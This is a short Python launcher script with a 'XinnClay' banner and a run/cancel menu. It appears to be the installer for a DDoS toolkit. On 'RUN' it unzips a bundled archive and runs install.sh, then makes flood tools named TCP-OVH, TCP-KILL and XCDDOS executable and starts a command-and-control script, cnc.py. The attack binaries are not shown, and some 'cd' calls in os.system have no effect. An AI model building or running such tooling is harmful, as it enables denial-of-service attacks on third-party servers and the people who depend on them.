import os
print("""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
""")

print("""\33[0;32m[1] RUN\n[2] CANCEL\nWhich one do you use?""")

c = input(">>>: ")
if c == "1":
    os.system("unzip node_modules.zip")
    os.system("rm -rf node_modules.zip")
    os.system("bash install.sh")
    os.system("cd")
    os.system("cd XCDDOS")
    os.system("chmod +x TCP-OVH")
    os.system("chmod +x TCP-GET")
    os.system("chmod +x OVH-TCP-V2")
    os.system("chmod +x TCP-KILL")
    os.system("chmod +x *")
    os.system("cd")
    os.system("cd XCDDOS")
    os.system("chmod +x XCDDOS")
    os.system("cd")
    os.system("cd XCDDOS")
    os.system("python3 cnc.py")

elif c == "2":
    os.system("clear")

print("\33[0;32m[ √ ] S U C C E S S F U L L Y")
